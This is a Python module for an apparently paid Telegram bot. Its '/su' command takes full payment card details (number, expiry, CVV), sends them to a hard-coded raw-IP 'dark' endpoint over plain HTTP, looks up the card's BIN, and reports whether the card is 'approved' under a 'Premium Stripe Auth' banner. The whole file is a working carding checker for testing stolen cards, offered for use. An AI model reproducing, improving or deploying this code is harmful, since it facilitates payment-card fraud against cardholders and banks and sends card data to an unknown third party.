import time
import requests
from telebot import TeleBot

API_URL = "http://147.93.105.138:8899/dark/cc={}"
BIN_API_URL = "https://bins.antipublic.cc/bins/{}"
ID_FILE = "id.txt"  # Premium users file

def handle_su_command(bot: TeleBot, message, user_cooldowns=None, admin_id=None):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id

    # ✅ Check if user is still premium
    if not is_premium_user(user_id):
        bot.send_message(chat_id, "❌ <b>Your premium access has expired or you are not a premium user.</b>", parse_mode="HTML")
        return

    # ✅ Extract card details
    try:
        _, card_info = message.text.split(" ", 1)
        card_info = card_info.strip().replace("/", "|")
        card_parts = card_info.split("|")

        if len(card_parts) != 4:
            bot.send_message(chat_id, "⚠️ Invalid format! Use: `/su CC|MM|YYYY|CVV`", parse_mode="Markdown")
            return

        cc, mm, yyyy, cvv = card_parts
        bin_number = cc[:6]
    except ValueError:
        bot.send_message(chat_id, "⚠️ Please provide a card in this format: `/su CC|MM|YYYY|CVV`", parse_mode="Markdown")
        return

    # ✅ Fetch bank & country details
    bank_info, country_info = get_bin_details(bin_number)

    # ✅ Send Premium Progress Bar Animation
    progress_msg = send_premium_progress_message(bot, chat_id)

    # ✅ Process Card
    start_time = time.time()
    response = requests.get(API_URL.format(card_info))

    if response.status_code == 200:
        api_data = response.json()
        formatted_response = format_su_response(api_data, bank_info, country_info, time.time() - start_time)
    else:
        formatted_response = "<b>❌ API Error:</b> Unable to fetch response."

    # ✅ Send Final Response
    bot.edit_message_text(formatted_response, chat_id, progress_msg.message_id, parse_mode="HTML")

def is_premium_user(user_id):
    """Checks if a user is premium by verifying chat ID and expiration timestamp in id.txt."""
    try:
        with open(ID_FILE, "r") as file:
            lines = file.readlines()

        current_time = int(time.time())  # Get current Unix timestamp
        valid_users = []
        is_premium = False

        for line in lines:
            parts = line.strip().split(":")
            if len(parts) == 2:
                uid, expiry_timestamp = parts
                
                try:
                    expiry_timestamp = int(float(expiry_timestamp))  # Convert safely to integer
                except ValueError:
                    continue  # Skip invalid entries
                
                if uid == user_id and expiry_timestamp > current_time:
                    is_premium = True  # User has valid premium access
                if expiry_timestamp > current_time:
                    valid_users.append(f"{uid}:{expiry_timestamp}")  # Keep only valid users

        # ✅ Auto-remove expired users from id.txt
        with open(ID_FILE, "w") as file:
            file.write("\n".join(valid_users) + "\n")

        return is_premium
    except FileNotFoundError:
        return False

def get_bin_details(bin_number):
    """Fetches bank & country details using BIN API."""
    try:
        response = requests.get(BIN_API_URL.format(bin_number))
        if response.status_code == 200:
            data = response.json()
            bank = data.get("bank", "Unknown Bank")
            country = f"{data.get('country', 'Unknown Country')} ({data.get('country_code', 'N/A')})"
            return bank, country
    except:
        pass
    return "Unknown Bank", "Unknown Country"

def send_premium_progress_message(bot, chat_id):
    """Sends a premium-style animated progress bar with a dark-to-bright color transition."""
    
    progress_bar = [
        "⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛",  # 0%  
        "🟥⬛⬛⬛⬛⬛⬛⬛⬛⬛",  # 10%  
        "🟥🟥⬛⬛⬛⬛⬛⬛⬛⬛",  # 20%  
        "🟥🟥🟥⬛⬛⬛⬛⬛⬛⬛",  # 30%  
        "🟥🟥🟥🟧⬛⬛⬛⬛⬛⬛",  # 40%  
        "🟥🟥🟥🟧🟧⬛⬛⬛⬛⬛",  # 50%  
        "🟥🟥🟥🟧🟧🟧⬛⬛⬛⬛",  # 60%  
        "🟥🟥🟥🟧🟧🟧🟨⬛⬛⬛",  # 70%  
        "🟥🟥🟥🟧🟧🟧🟨🟨⬛⬛",  # 80%  
        "🟥🟥🟥🟧🟧🟧🟨🟨🟨⬛",  # 90%  
        "🟥🟥🟥🟧🟧🟧🟨🟨🟩",  # 95%  
        "🟥🟥🟥🟧🟧🟧🟨🟨🟩🟩",  # 98%  
        "🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩",  # 100%  
    ]

    progress_messages = [
        "⚡ <b>Processing Your Card...</b> ⏳",
        "💳 <b>Verifying Card Details...</b> ✅",
        "🛡 <b>Securing Connection...</b> 🔐",
        "🔍 <b>Checking with Stripe...</b> 📡",
        "🚀 <b>Finalizing Transaction...</b> 💥",
    ]

    progress_msg = bot.send_message(chat_id, f"{progress_messages[0]}\n\n{progress_bar[0]}", parse_mode="HTML")

    for i in range(1, len(progress_bar)):
        time.sleep(0.7)  # Smooth animation effect
        bot.edit_message_text(f"{progress_messages[min(i // 2, len(progress_messages) - 1)]}\n\n{progress_bar[i]}", chat_id, progress_msg.message_id, parse_mode="HTML")

    return progress_msg

def format_su_response(api_data, bank, country, time_taken):
    """Formats the API response into a premium-style message."""
    
    # Check if the 'card' key exists and extract card details
    card_details = api_data.get("card", "")
    if not card_details:
        return "<b>❌ Invalid response from the API. Card details not found.</b>"

    cc_details = card_details.split("=")[-1].split("|")  # Extract card details after 'cc='

    # If the card format is incorrect or not provided, handle gracefully
    if len(cc_details) != 4:
        return "<b>❌ Card format is incorrect. Please use: CC|MM|YYYY|CVV</b>"

    card = cc_details[0]
    expiry = f"{cc_details[1]}/{cc_details[2]}"
    cvv = cc_details[3]

    # Get status and response message
    response_text = api_data.get("message", "Unknown Response")
    status = "✅ Approved" if "approved" in response_text.lower() else "❌ Declined"

    # If status is declined, include the message for the declined card
    if status == "❌ Declined":
        response_text = api_data.get("message", "Your card number is incorrect.")

    # Build the final response
    return f"""
━━━━━━━━━━━━━━━━━━━━━━━━
🔥 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐒𝐓𝐑𝐈𝐏𝐄 𝐀𝐔𝐓𝐇 🔥
━━━━━━━━━━━━━━━━━━━━━━━━
💳 𝑪𝒂𝒓𝒅: <code>{card}</code>
📆 𝑬𝒙𝒑𝒊𝒓𝒚: <code>{expiry}</code>
🔑 𝑪𝑽𝑽: <code>{cvv}</code>
🏦 𝑩𝒂𝒏𝒌: <code>{bank}</code>
🌍 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <code>{country}</code>
📌 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆: <code>{response_text}</code>
⚡ 𝑺𝒕𝒂𝒕𝒖𝒔: {status}
━━━━━━━━━━━━━━━━━━━━━━━
⏱ 𝑻𝒊𝒎𝒆 𝑻𝒂𝒌𝒆𝒏: {time_taken:.2f} sec
━━━━━━━━━━━━━━━━━━━━━━━
"""
